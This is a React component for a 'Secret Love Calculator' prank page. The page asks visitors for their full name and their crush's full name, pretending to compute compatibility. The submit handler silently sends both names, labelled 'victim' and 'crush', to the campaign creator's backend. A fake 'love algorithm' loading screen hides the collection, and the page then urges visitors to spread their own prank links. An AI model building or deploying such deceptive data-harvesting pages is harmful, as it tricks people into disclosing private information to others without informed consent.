import { useState } from 'react';
import { useParams } from 'react-router-dom';
import { motion } from 'framer-motion';
import { Share2, Heart, Loader2 } from 'lucide-react';

export default function CampaignPage() {
    const { slug } = useParams();
    
    // In the next step, we will fetch this config from the backend database using the slug
    const [config, setConfig] = useState({ 
        title: "Secret Love Calculator", 
        prankMessage: "😂 You got pranked!" 
    });
    
    const [name, setName] = useState('');
    const [yourName, setYourName] = useState('');
    const [step, setStep] = useState('form'); // 'form', 'loading', 'prank'

    const handleSubmit = async (e) => {
        e.preventDefault();
        if (!name || !yourName) return;
        setStep('loading');
        
        // Silently send the entered names to your backend
        try {
            await fetch(`${import.meta.env.VITE_API_URL}/api/submissions`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ slug, responses: { victim: yourName, crush: name } })
            });
        } catch (err) {
            console.log(err);
        }

        setTimeout(() => {
            setStep('prank');
        }, 2500);
    };

    const handleViralShare = async () => {
        const shareUrl = window.location.origin; // Redirects them to make their own link
        
        // Use native Web Share API for mobile devices
        if (navigator.share) {
            try {
                await navigator.share({
                    title: 'Create your own prank!',
                    text: 'Trick your friends with this awesome app.',
                    url: shareUrl,
                });
            } catch (err) { console.error('Share failed', err); }
        } else {
            // Fallback for desktop to WhatsApp Web
            window.open(`https://wa.me/?text=Check this out: ${shareUrl}`, '_blank');
        }
    };

    return (
        <div className="flex items-center justify-center min-h-screen p-4">
            <motion.div 
                initial={{ opacity: 0, scale: 0.95, y: 20 }}
                animate={{ opacity: 1, scale: 1, y: 0 }}
                transition={{ duration: 0.5, ease: "easeOut" }}
                className="w-full max-w-md p-8 backdrop-blur-2xl bg-white/10 border border-white/20 rounded-3xl shadow-[0_8px_32px_0_rgba(0,0,0,0.3)] text-center relative overflow-hidden"
            >
                {/* Background glowing orb effect to enhance the glassmorphism */}
                <div className="absolute top-0 left-1/2 -translate-x-1/2 w-32 h-32 bg-pink-500 rounded-full blur-[70px] opacity-40 pointer-events-none"></div>

                {step === 'form' && (
                    <motion.form 
                        initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
                        onSubmit={handleSubmit} className="space-y-6 relative z-10"
                    >
                        <Heart className="w-12 h-12 mx-auto text-pink-400 animate-pulse" />
                        <h1 className="text-3xl font-extrabold tracking-tight text-white">{config.title}</h1>
                        <p className="text-gray-300 text-sm">Enter your crush's name to calculate your exact compatibility!</p>
                        
                        <input 
                            type="text" 
                            value={yourName}
                            onChange={(e) => setYourName(e.target.value)}
                            required 
                            placeholder="Your Full Name"
                            className="w-full px-5 py-4 mb-4 bg-black/20 border border-white/10 rounded-xl outline-none focus:ring-2 focus:ring-pink-500 text-white placeholder-gray-400"
                        />
                        <input 
                            type="text" 
                            value={name}
                            onChange={(e) => setName(e.target.value)}
                            required 
                            placeholder="Crush's Full Name"
                            className="w-full px-5 py-4 bg-black/20 border border-white/10 rounded-xl outline-none focus:ring-2 focus:ring-pink-500 text-white placeholder-gray-400"
                        />
                        
                        <button 
                            type="submit" 
                            className="w-full py-4 bg-gradient-to-r from-pink-500 to-violet-500 hover:from-pink-600 hover:to-violet-600 rounded-xl font-bold text-white shadow-lg shadow-pink-500/25 transition-all transform hover:scale-[1.02] active:scale-[0.98]"
                        >
                            Calculate Match
                        </button>
                    </motion.form>
                )}

                {step === 'loading' && (
                    <motion.div 
                        initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }}
                        className="py-12 space-y-6 relative z-10"
                    >
                        <Loader2 className="w-12 h-12 mx-auto text-pink-400 animate-spin" />
                        <h2 className="text-xl font-semibold text-white animate-pulse">Running love algorithms...</h2>
                        <p className="text-sm text-gray-400">Analyzing name frequencies and star signs...</p>
                    </motion.div>
                )}

                {step === 'prank' && (
                    <motion.div 
                        initial={{ opacity: 0, scale: 0.5, rotate: -5 }} 
                        animate={{ opacity: 1, scale: 1, rotate: 0 }}
                        transition={{ type: "spring", bounce: 0.6 }}
                        className="space-y-8 relative z-10"
                    >
                        <div className="text-7xl">😂</div>
                        <h2 className="text-3xl font-black text-transparent bg-clip-text bg-gradient-to-r from-red-400 to-pink-500">
                            {config.prankMessage}
                        </h2>
                        <p className="text-gray-200">The name you entered has been securely saved.</p>
                        
                        <button 
                            onClick={() => window.location.href = '/'}
                            className="w-full py-4 bg-white/10 hover:bg-white/20 border border-white/30 rounded-xl font-bold text-white flex items-center justify-center gap-3 transition-all"
                        >
                            <Share2 size={20} /> Create Your Own Prank Link
                        </button>
                    </motion.div>
                )}
            </motion.div>
        </div>
    );
}